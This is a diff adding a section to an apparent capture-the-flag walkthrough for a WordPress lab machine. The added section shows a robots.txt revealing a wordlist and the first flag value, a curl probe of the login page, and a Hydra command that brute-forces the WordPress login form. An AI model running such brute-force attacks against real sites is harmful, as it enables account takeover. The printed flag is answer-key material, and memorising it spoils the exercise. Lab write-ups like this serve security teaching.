@@ -23,8 +23,6 @@ nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.235.2
 
 {% tabs %}
 {% tab title="OWASP DirB" %}
-{% embed url="http://10.10.235.2" %}
-
 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 
 \*
@@ -150,6 +148,69 @@ Files found with a 200 responce:
 ```
 {% endtab %}
 {% endtabs %}
+
+{% embed url="http://10.10.105.131/robots.txt" %}
+
+{% tabs %}
+{% tab title="robots.txt" %}
+```text
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+{% endtab %}
+
+{% tab title="key-1-of-3.txt" %}
+```text
+073403c8a58a1f80d943455fb30724b9
+```
+{% endtab %}
+
+{% tab title="curl" %}
+```
+curl -v http://10.10.105.131/wp-login.php
+```
+{% endtab %}
+
+{% tab title="curl output" %}
+```
+*   Trying 10.10.105.131:80...
+* Connected to 10.10.105.131 (10.10.105.131) port 80 (#0)
+> GET /wp-login.php HTTP/1.1
+> Host: 10.10.105.131
+> User-Agent: curl/7.74.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Wed, 28 Jul 2021 17:16:05 GMT
+< Server: Apache
+< X-Powered-By: PHP/5.5.29
+< Expires: Wed, 11 Jan 1984 05:00:00 GMT
+< Cache-Control: no-cache, must-revalidate, max-age=0
+< Pragma: no-cache
+< X-Frame-Options: SAMEORIGIN
+< Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
+< Vary: Accept-Encoding
+< X-Mod-Pagespeed: 1.9.32.3-4523
+< Cache-Control: max-age=0, no-cache
+< Content-Length: 2671
+< Content-Type: text/html; charset=UTF-8
+< 
+
+```
+{% endtab %}
+
+{% tab title="" %}
+```
+hydra -L fsocity.dic \
+      -P fsocity.dic 10.10.105.131 \
+      -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
+```
+{% endtab %}
+{% endtabs %}
+
+
 
 
 
